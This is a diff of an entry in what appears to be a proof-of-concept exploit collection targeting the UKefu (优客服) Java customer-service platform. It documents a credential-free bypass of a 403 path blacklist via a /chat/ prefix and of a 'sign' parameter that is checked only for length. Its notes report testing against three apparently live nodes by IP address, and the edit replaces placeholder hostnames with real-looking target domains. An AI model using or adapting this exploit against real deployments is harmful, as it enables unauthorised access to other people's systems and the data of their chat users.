@@ -9,7 +9,7 @@
 - **language**: python
 - **source**: self
 - **verified**: 1
-- **verified_note**: 在 example.com (203.0.113.130:443) 实测通过：/login.html → 403 (len=12, `拒绝访问`)；/chat/login.html → 200 (len=6014)；/chat/index?sign=1 → 403 (`访问频繁`)；/chat/index?sign=<64×A> → 200 (len=7034, title=在线咨询)；/chat/a/b → 404。三个等价节点 tgt2966(203.0.113.130) / tgt7231(203.0.113.139) / tgt6542(203.0.113.129) 行为完全一致。无需任何凭据。
+- **verified_note**: 在 example.com (203.0.113.130:443) 实测通过：/login.html → 403 (len=12, `拒绝访问`)；/chat/login.html → 200 (len=6014)；/chat/index?sign=1 → 403 (`访问频繁`)；/chat/index?sign=<64×A> → 200 (len=7034, title=在线咨询)；/chat/a/b → 404。三个等价节点 pziikq7(203.0.113.130) / pzmnzup(203.0.113.139) / pzq6b85(203.0.113.129) 行为完全一致。无需任何凭据。
 - **path**: pocs/优客服-ukefu-路径-acl-绕过-chat-前缀放行-sign-仅长度校验/ukefu_path_acl_bypass.py
 - **tags**: ukefu,优客服,java,spring,403绕过,访问控制,sign,路径黑名单
 - **created_at**: 2026-10-05T04:24:25.057Z
@@ -35,7 +35,7 @@ python ukefu_path_acl_bypass.py <host>
 # -*- coding: utf-8 -*-
 """
 优客服 UKefu (Java) 双绕过 POC：应用层 403 路径黑名单 + sign 长度门槛
-实测环境：example.com / target170.example.com / target171.example.com
+实测环境：example.com / chatadmin.pzmnzup.com / chatadmin.pzq6b85.com
 
 绕过 1：403 黑名单是「精确路径字符串匹配」，大小写敏感、加后缀/编码/分隔符全挂，
         但 /chat/ 前缀整体不在黑名单 —— 同一个 login.html 换前缀就能读：
@@ -79,7 +79,7 @@ def bypass_sign(host):
         t = re.search(rb"<title>(.*?)</title>", c, re.S)
         print("  sign=%-18s -> %-4s len=%-6d title=%s"
               % (sg[:18], sc, len(c),
-                 target172.example.com(1).decode("utf-8", "replace") if t else "-"))
+                 t.group(1).decode("utf-8", "replace") if t else "-"))
         time.sleep(1.5)
 
 
